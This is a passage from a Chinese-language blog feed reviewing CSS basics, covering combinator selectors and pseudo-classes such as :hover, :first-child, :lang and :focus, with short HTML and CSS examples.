class="hljs-attribute">font-weight</span>:bold;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>“Sansation_Bold.ttf”是另一种字体文件，包含 Sansation 字体的粗体字。</p>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-CSS基础知识复习（四）</title>
    <link href="/2021/05/14/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2021/05/14/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-CSS%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>CSS 指层叠样式表（Cascading Style Sheets）。通过与 XHTML 结合，CSS 可以帮助我们实行表现与结构分离的开发模式。 通过使用 CSS 来提升工作效率！<br>外部样式表通常存储在 CSS 文件中，外部样式表可以极大提高工作效率。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-组合选择符"><a href="#1-组合选择符" class="headerlink" title="1.组合选择符"></a>1.组合选择符</h2><p>CSS 组合选择符可以让你直观的明白选择器与选择器之间的关系。组合选择符说明了两个选择器直接的关系。组合选择符包括各种简单选择符的组合方式。</p><p>包含四种组合方式：</p><blockquote><ol><li>后代选取器(以空格分隔)</li><li>子元素选择器(以大于号分隔）</li><li>相邻兄弟选择器（以加号分隔）</li><li>普通兄弟选择器（以波浪号分隔）</li></ol></blockquote><h3 id="1-1-后代选取器（-）"><a href="#1-1-后代选取器（-）" class="headerlink" title="1.1 后代选取器（ ）"></a>1.1 后代选取器（ ）</h3><p>后代选取器匹配所有指定元素的后代元素。</p><p>使用实例：选取所有插入到 div 元素中的 p 元素</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">background-color</span>:yellow;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="1-2-子元素选择器（-gt-）"><a href="#1-2-子元素选择器（-gt-）" class="headerlink" title="1.2 子元素选择器（&gt;）"></a>1.2 子元素选择器（&gt;）</h3><p>子元素选择器（Child selectors）只能选择作为某元素子元素（直接子元素）的元素。即父元素中的直接子元素（如：div中的直接子元素 p），不能是间接子元素（如：div 中有 span ，span 中有p）。</p><p>使用实例：选择了div元素中所有直接子元素 p ：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&gt;<span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">background-color</span>:yellow;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">div</span>&gt;<span class="hljs-selector-tag">p</span>&#123;</span><br><span class="css"><span class="hljs-attribute">background-color</span>:yellow;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎来到我的主页<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>我叫唐纳德<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我住在达克堡。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!--只有这个才有效果--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是间接子元素。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我最好的朋友是米奇。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-3-相邻兄弟选择器（-）"><a href="#1-3-相邻兄弟选择器（-）" class="headerlink" title="1.3 相邻兄弟选择器（+）"></a>1.3 相邻兄弟选择器（+）</h3><p>相邻兄弟选择器（Adjacent sibling selector）可选择紧接在另一元素后的元素，且二者有相同父元素。如果需要选择紧接在另一个元素后的元素，而且二者有相同的父元素，可以使用相邻兄弟选择器（Adjacent sibling selector）。即在一个元素结束后的下一个元素。</p><p>使用实例：选取所有位于 div 元素后的第一个 p 元素：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>+<span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">background-color</span>:yellow;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSS<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">div</span>+<span class="hljs-selector-tag">p</span>&#123;</span><br><span class="css"><span class="hljs-attribute">background-color</span>:yellow;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>欢迎来到我的主页<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>我叫唐纳德<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我住在达克堡。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是被修改的。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!--只有这个才有效果--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我不是被设计的。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-4-普通相邻兄弟选择器（-）"><a href="#1-4-普通相邻兄弟选择器（-）" class="headerlink" title="1.4 普通相邻兄弟选择器（~）"></a>1.4 普通相邻兄弟选择器（~）</h3><p>普通兄弟选择器选取所有指定元素的相邻兄弟元素。</p><p>使用实例：选取所有 div 元素之后的所有相邻兄弟元素 p :  </p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>~<span class="hljs-selector-tag">p</span>&#123;<br><span class="hljs-attribute">background-color</span>:yellow;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>W3Cschool教程(w3cschool.cn)<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">div</span>~<span class="hljs-selector-tag">p</span>&#123;</span><br><span class="css"><span class="hljs-attribute">background-color</span>:yellow;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>段落 1。 在 div 中。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>段落 2。 在 div 中。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>段落 3。不在 div 中。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!--这个有效果--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>段落 4。不在 div 中。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <span class="hljs-comment">&lt;!--这个有效果--&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="2-伪类"><a href="#2-伪类" class="headerlink" title="2.伪类"></a>2.伪类</h2><p>伪类是用来添加一些选择器的特殊效果。由于状态的变化是非静态的，所以元素达到一个特定状态时，它可能得到一个伪类的样式；当状态改变时，它又会失去这个样式。由此可以看出，它的功能和 class 有些类似，但它是基于文档之外的抽象，所以叫伪类。</p><p>伪类/元素：</p><table><thead><tr><th align="center">选择器</th><th align="center">示例</th><th align="center">示例说明</th></tr></thead><tbody><tr><td align="center">:link</td><td align="center">a:link</td><td align="center">选择所有未访问链接</td></tr><tr><td align="center">:visited</td><td align="center">a:visited</td><td align="center">选择所有访问过的链接</td></tr><tr><td align="center">:active</td><td align="center">a:active</td><td align="center">选择正在活动链接</td></tr><tr><td align="center">:hover</td><td align="center">a:hover</td><td align="center">把鼠标放在链接上的状态</td></tr><tr><td align="center">:focus</td><td align="center">input:focus</td><td align="center">选择元素输入后具有焦点</td></tr><tr><td align="center">:first-letter</td><td align="center">p:first-letter</td><td align="center">选择每个&lt;p&gt; 元素的第一个字母</td></tr><tr><td align="center">:first-line</td><td align="center">p:first-line</td><td align="center">选择每个&lt;p&gt; 元素的第一行</td></tr><tr><td align="center">:first-child</td><td align="center">p:first-child</td><td align="center">选择器匹配属于任意元素的第一个子元素的 &lt;]p&gt; 元素</td></tr><tr><td align="center">:before</td><td align="center">p:before</td><td align="center">在每个&lt;p&gt;元素之前插入内容</td></tr><tr><td align="center">:after</td><td align="center">p:after</td><td align="center">在每个&lt;p&gt;元素之后插入内容</td></tr><tr><td align="center">:lang(<em>language</em>)</td><td align="center">p:lang(it)</td><td align="center">为&lt;p&gt;元素的lang属性选择一个开始值</td></tr></tbody></table><h3 id="2-1-语法"><a href="#2-1-语法" class="headerlink" title="2.1 语法"></a>2.1 语法</h3><p>伪类语法：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">selector:pseudo-class &#123;property:value;&#125;<br></code></pre></div></td></tr></table></figure><p>CSS类使用伪类：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">selector<span class="hljs-selector-class">.class</span>:pseudo-class &#123;property:value;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="2-2-anchor伪类"><a href="#2-2-anchor伪类" class="headerlink" title="2.2 anchor伪类"></a>2.2 anchor伪类</h3><p>链接的不同状态都可以以不同的方式显示。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#FF0000</span>;&#125; <span class="hljs-comment">/* 未访问的链接 */</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#00FF00</span>;&#125; <span class="hljs-comment">/* 已访问的链接 */</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#FF00FF</span>;&#125; <span class="hljs-comment">/* 鼠标划过链接 */</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#0000FF</span>;&#125; <span class="hljs-comment">/* 已选中的链接 */</span><br></code></pre></div></td></tr></table></figure><p>在 CSS 定义中：<br>a:hover 必须被置于 a:link 和 a:visited 之后，才是有效的。<br>a:active 必须被置于 a:hover 之后，才是有效的。<br>伪类的名称不区分大小写。</p><h3 id="2-3-伪类和CSS类"><a href="#2-3-伪类和CSS类" class="headerlink" title="2.3 伪类和CSS类"></a>2.3 伪类和CSS类</h3><p>伪类可以与 CSS 类配合使用：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-comment">/* 如果链接已被访问，会显示为红色。*/</span><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.red</span><span class="hljs-selector-pseudo">:visited</span> &#123;<span class="hljs-attribute">color</span>:<span class="hljs-number">#FF0000</span>;&#125;       <br>&lt;a class=&quot;red&quot; href=&quot;css-syntax.html&quot;&gt;CSS Syntax&lt;/a&gt;<br></code></pre></div></td></tr></table></figure><h3 id="2-4-first-child-伪类"><a href="#2-4-first-child-伪类" class="headerlink" title="2.4 :first - child 伪类"></a>2.4 :first - child 伪类</h3><p>可以使用 :first-child 伪类来选择元素的第一个子元素。</p><p>使用实例1：匹配作为任何元素的第一个子元素的 p 元素：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-child&#123;</span><br><span class="css"><span class="hljs-attribute">color</span>:blue;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是一个男人。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是一个女人。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>使用实例2：选择相匹配的所有 p 元素的第一个 i 元素：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">p</span> &gt; <span class="hljs-selector-tag">i</span><span class="hljs-selector-pseudo">:first</span>-child&#123;</span><br><span class="css"><span class="hljs-attribute">color</span>:blue;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是一个 <span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>男人<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> man. 我是一个 <span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>男人<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> man.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是一个 <span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>男人<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> man. 我是一个 <span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>男人<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> man..<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>使用实例3：选择器匹配所有作为元素的第一个子元素的 p 元素中的所有 i 元素：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-child <span class="hljs-selector-tag">i</span>&#123;</span><br><span class="css"><span class="hljs-attribute">color</span>:blue;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是一个 <span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>强壮<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> 的男人. 我是一个 <span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>强壮<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> 的男人.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>我是一个 <span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>强壮<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> 的男人. 我是一个 <span class="hljs-tag">&lt;<span class="hljs-name">i</span>&gt;</span>强壮<span class="hljs-tag">&lt;/<span class="hljs-name">i</span>&gt;</span> 的男人.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-5-lang伪类"><a href="#2-5-lang伪类" class="headerlink" title="2.5 lang伪类"></a>2.5 lang伪类</h3><p>:lang 伪类使你有能力为不同的语言定义特殊的规则。</p><p>使用实例：:lang 类为属性值为 no 的 q 元素定义引号的类型：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">q</span><span class="hljs-selector-pseudo">:lang</span>(no) &#123;<span class="hljs-attribute">quotes</span>: <span class="hljs-string">&quot;~&quot;</span> <span class="hljs-string">&quot;~&quot;</span>;&#125;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>一些文字 <span class="hljs-tag">&lt;<span class="hljs-name">q</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;no&quot;</span>&gt;</span>段落中的引用<span class="hljs-tag">&lt;/<span class="hljs-name">q</span>&gt;</span> 一些文字。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="2-6-focus伪类"><a href="#2-6-focus伪类" class="headerlink" title="2.6 :focus伪类"></a>2.6 :focus伪类</h3><p>选择获得焦点的输入字段，并设置其样式。</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span>&#123; <br><span class="hljs-attribute">background-color</span>:yellow;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><br><span class="css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span>&#123;</span><br><span class="css"><span class="hljs-attribute">background-color</span>:yellow;</span><br>&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>在文本框中点击，您会看到黄色的背景：<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span><br>First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;firstname&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 